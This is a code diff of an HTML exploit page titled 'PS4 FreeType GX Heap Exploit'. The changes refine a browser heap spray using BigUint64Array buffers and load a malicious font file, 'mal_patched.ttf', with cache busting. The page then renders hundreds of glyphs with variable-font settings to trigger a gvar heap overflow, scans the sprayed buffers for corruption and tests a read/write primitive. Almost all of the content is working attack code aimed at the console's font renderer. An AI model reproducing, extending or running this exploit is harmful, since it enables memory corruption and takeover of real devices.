@@ -11,34 +11,49 @@
       padding: 2em;
       font-size: 18px;
     }
-    .log { white-space: pre-wrap; margin-top: 1em; background: #111; padding: 1em; border: 1px solid #0f0; }
-    .status { font-size: 24px; margin-top: 1em; }
-    #glyph { font-size: 100px; margin-top: 1em; }
+    .log {
+      white-space: pre-wrap;
+      margin-top: 1em;
+      background: #111;
+      padding: 1em;
+      border: 1px solid #0f0;
+    }
+    .status {
+      font-size: 24px;
+      margin-top: 1em;
+    }
+    .glyph-test {
+      font-size: 180px;
+      font-family: 'boom';
+      font-variation-settings: "wght" 999;
+      margin-top: 1em;
+      color: red;
+    }
   </style>
 </head>
 <body>
-  <h1>🧨 PS4 FreeType Heap Exploit</h1>
+  <h1>💣 PS4 FreeType GX Heap Exploit</h1>
   <button onclick="startExploit()">Start Exploit</button>
-  <div id="glyph">!!!!!!!</div>
+  <div class="glyph-test" id="glyph">Init…</div>
   <div class="log" id="log">Ready.</div>
-  <div class="status" id="status">Waiting...</div>
+  <div class="status" id="status">Idle</div>
 
-  <!-- 💣 INSERTED EXPLOIT CODE -->
   <script>
     const SPRAY_CNT = 30000;
     const SPRAY_SIZE = 0x100;
     const spray = [];
     let corruptedIdx = -1;
 
-    function log(msg) {
+    const log = msg => {
       document.getElementById("log").innerText += msg + "\n";
-    }
+    };
 
     function sprayHeap() {
       for (let i = 0; i < SPRAY_CNT; i++) {
-        const buf = new ArrayBuffer(SPRAY_SIZE);
-        const f64 = new Float64Array(buf);
-        for (let j = 0; j < f64.length; j++) f64[j] = 0x4343434343434343;
+        const size = SPRAY_SIZE + ((i % 8) * 8); // slight randomization
+        const buf = new ArrayBuffer(size);
+        const f64 = new BigUint64Array(buf);
+        for (let j = 0; j < f64.length; j++) f64[j] = 0x4343434343434343n;
         spray.push({ f64, buf });
       }
       log("[+] Heap spray complete.");
@@ -47,8 +62,8 @@
     function detectCorruption() {
       for (let i = 0; i < spray.length; i++) {
         const f64 = spray[i].f64;
-        if (f64[0] === 0x0108200700000000) {
-          log(`[!] Corrupted buffer at index ${i}`);
+        if (f64[0] !== 0x4343434343434343n) {
+          log(`[!] CORRUPTION at spray[${i}] f64[0] = ${f64[0].toString(16)}`);
           corruptedIdx = i;
           return spray[i];
         }
@@ -60,7 +75,7 @@
     function tryRWPrimitive(corrupted) {
       log("[*] Trying R/W via corrupted buffer...");
       try {
-        corrupted.f64[2] = 0x41414141;
+        corrupted.f64[2] = 0x41414141n;
         let result = corrupted.f64[2];
         log("[+] Readback: " + result.toString(16));
       } catch (e) {
@@ -69,12 +84,10 @@
     }
 
     async function loadFont() {
-      const font = new FontFace('boom', 'url("mal_patched.ttf")');
-
+      const font = new FontFace('boom', 'url("mal_patched.ttf?v=' + Date.now() + '")'); // cache bust
       try {
         await font.load();
         document.fonts.add(font);
-        document.getElementById("glyph").style.fontFamily = 'boom';
         log("[+] Font loaded and applied.");
       } catch (e) {
         log("[-] Font load failed.");
@@ -83,17 +96,29 @@
 
     async function startExploit() {
       document.getElementById("status").textContent = "Running...";
+      document.getElementById("status").style.color = "#ff0";
       sprayHeap();
       await new Promise(r => setTimeout(r, 500));
       await loadFont();
       await new Promise(r => setTimeout(r, 300));
 
+      // Now render glyphs that trigger the gvar write
+      const glyphElem = document.getElementById("glyph");
+      glyphElem.innerText = '!'.repeat(300); // uni0021 = target
+      glyphElem.style.fontFamily = 'boom';
+      glyphElem.style.fontSize = '200px';
+      glyphElem.style.fontVariationSettings = '"wght" 999';
+
+      await new Promise(r => setTimeout(r, 400));
+
       const corrupted = detectCorruption();
       if (corrupted) {
         tryRWPrimitive(corrupted);
-        document.getElementById("status").textContent = "Corruption detected! ✅";
+        document.getElementById("status").textContent = "✅ CORRUPTION DETECTED";
+        document.getElementById("status").style.color = "lime";
       } else {
-        document.getElementById("status").textContent = "No corruption ❌";
+        document.getElementById("status").textContent = "❌ No corruption";
+        document.getElementById("status").style.color = "red";
       }
     }
   </script>
